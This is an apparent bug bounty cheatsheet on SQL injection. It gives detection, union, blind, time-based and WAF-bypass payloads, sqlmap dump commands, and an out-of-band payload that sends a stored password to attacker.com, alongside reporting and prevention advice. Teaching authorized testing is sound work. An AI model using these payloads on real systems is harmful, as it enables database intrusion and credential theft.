# SQL Injection (SQLi) — Complete Bug Bounty Cheatsheet

> **Category:** Injection — OWASP A05:2025  
> **Severity:** Critical (P1) — can lead to full database dump, auth bypass, RCE  
> **Platforms:** HackerOne, Bugcrowd, Intigriti — always in scope

---

## What is SQL Injection?

SQL Injection occurs when **untrusted user input is inserted directly into a SQL query** without proper sanitization. The attacker can manipulate the query to read, modify, or delete data — or even execute OS commands.

```sql
-- Normal query
SELECT * FROM users WHERE username = 'alice' AND password = 'secret';

-- After injection with: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
-- Returns ALL users → authentication bypassed!
```

---

## 5 Types of SQL Injection

### 1. Classic / In-Band SQLi
Output is returned directly in the HTTP response.

**Error-Based:**
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Union-Based:**
```sql
' ORDER BY 3--                          -- Find number of columns
' UNION SELECT null,null,null--         -- Match column count
' UNION SELECT null,username,password FROM users--
```

### 2. Blind Boolean SQLi
No output — app returns different responses for true/false.

```sql
' AND 1=1--    → True  (normal response)
' AND 1=2--    → False (different response)

-- Extract data char by char:
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(password,1,1))>100--
```

### 3. Blind Time-Based SQLi
No visible difference — infer via response delay.

```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; IF(1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)=1--
```

### 4. Out-of-Band SQLi
Data sent via DNS or HTTP to attacker's server.

```sql
-- MSSQL
'; EXEC xp_dirtree('//YOUR-BURP-COLLABORATOR.net/x')--

-- MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\x'))--
```

### 5. Second-Order SQLi
Payload stored in DB, executed later in different context.

```
Step 1: Register with username: admin'--
Step 2: Change password flow:
  UPDATE users SET password='new' WHERE username='admin'--'
  → Changes admin's password!
```

---

## SQLi Attack Flow

```
1. DISCOVER  → Find all input points (forms, params, headers, cookies)
2. TEST      → Inject: ' " ) -- /* */ OR AND
3. CONFIRM   → Check for errors, behavior changes, delays
4. ENUMERATE → DB version, table names, column names
5. EXTRACT   → Dump credentials, tokens, PII
6. REPORT    → Document with PoC, CVSS, business impact
```

---

## Quick Detection Payloads

```sql
-- Basic error triggers
'
"
`
')
")
`)`
' OR '1'='1
' OR 1=1--
" OR ""="
' OR 'x'='x
1' ORDER BY 1--
1' ORDER BY 100--    ← if error = column count found

-- Comment styles
-- (MySQL, MSSQL)
# (MySQL)
/* */ (all)
```

---

## Database Fingerprinting

```sql
-- MySQL
SELECT @@version
SELECT @@datadir

-- MSSQL
SELECT @@version
SELECT DB_NAME()

-- Oracle
SELECT * FROM v$version
SELECT banner FROM v$version WHERE rownum=1

-- PostgreSQL
SELECT version()

-- SQLite
SELECT sqlite_version()
```

---

## Enumeration Queries (MySQL)

```sql
-- List all databases
UNION SELECT schema_name FROM information_schema.schemata--

-- List tables in current DB
UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- List columns
UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Dump data
UNION SELECT username,password FROM users--
```

---

## WAF Bypass Techniques

```sql
-- Space bypass
SELECT/**/username/**/FROM/**/users

-- Case variation
SeLeCt UsErNaMe FrOm UsErS

-- URL encoding
%27 = '    %20 = space    %23 = #

-- Double encoding
%2527 = ' (double encoded)

-- Inline comments
SE/**/LECT

-- Scientific notation
1e0 UNION SELECT...
```

---

## SQLMap Cheatsheet

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1"

# POST request
sqlmap -u "https://target.com/login" --data="user=test&pass=test"

# With cookies (authenticated)
sqlmap -u "https://target.com/profile?id=1" --cookie="session=abc123"

# Dump all databases
sqlmap -u "https://target.com/?id=1" --dbs

# Dump specific table
sqlmap -u "https://target.com/?id=1" -D dbname -T users --dump

# Bypass WAF
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,randomcase

# Headers injection
sqlmap -u "https://target.com/" --headers="X-Forwarded-For: *"

# Blind with delay
sqlmap -u "https://target.com/?id=1" --technique=T --time-sec=5
```

---

## Where to Hunt SQLi (Bug Bounty)

| Location | What to Test |
|----------|-------------|
| Login forms | username, password fields |
| Search bars | query, keyword, search params |
| URL parameters | `?id=1`, `?user=alice`, `?category=2` |
| Order/filter | `?sort=name`, `?order=asc` |
| API endpoints | JSON body, REST params |
| HTTP Headers | User-Agent, Referer, X-Forwarded-For, Cookie |
| Registration | email, username, address fields |

---

## Bug Bounty Report Template for SQLi

```
Title: SQL Injection in /api/users?id= Parameter

Severity: Critical (CVSS 9.8)

Endpoint: GET /api/users?id=1

Payload: 1' UNION SELECT username,password,null FROM users--

Steps to Reproduce:
1. Navigate to https://target.com/api/users?id=1
2. Replace id value with: 1' UNION SELECT username,password,null FROM users--
3. Observe database credentials in response

Impact:
- Full database dump including user credentials
- Authentication bypass
- Potential for further exploitation (RCE via INTO OUTFILE)

Proof of Concept:
[attach screenshot/video showing data extraction]

Remediation:
- Use parameterized queries / prepared statements
- Input validation and whitelisting
- Principle of least privilege for DB user
```

---

## Prevention (Know It to Report It Better)

```python
# VULNERABLE
query = "SELECT * FROM users WHERE id = " + user_id

# SAFE — Parameterized Query
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# SAFE — ORM
User.objects.filter(id=user_id)
```

---

## Practice Labs

- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection) — 18 free labs
- [HackTheBox](https://hackthebox.com) — SQLi challenges
- [DVWA](https://github.com/digininja/DVWA) — Local practice
- [SQLi-labs](https://github.com/Audi-1/sqli-labs) — 75 SQLi scenarios

---

## Key Takeaway

> SQL Injection is **30+ years old** — and still one of the most rewarded bugs in bug bounty.  
> Always test every parameter. Automate with SQLMap but **understand manually first**.  
> A single SQLi can be worth **$5,000 – $50,000+** on major programs.

---

*Part of my 30-Day Bug Bounty Content Series — follow for daily notes & cheatsheets.*
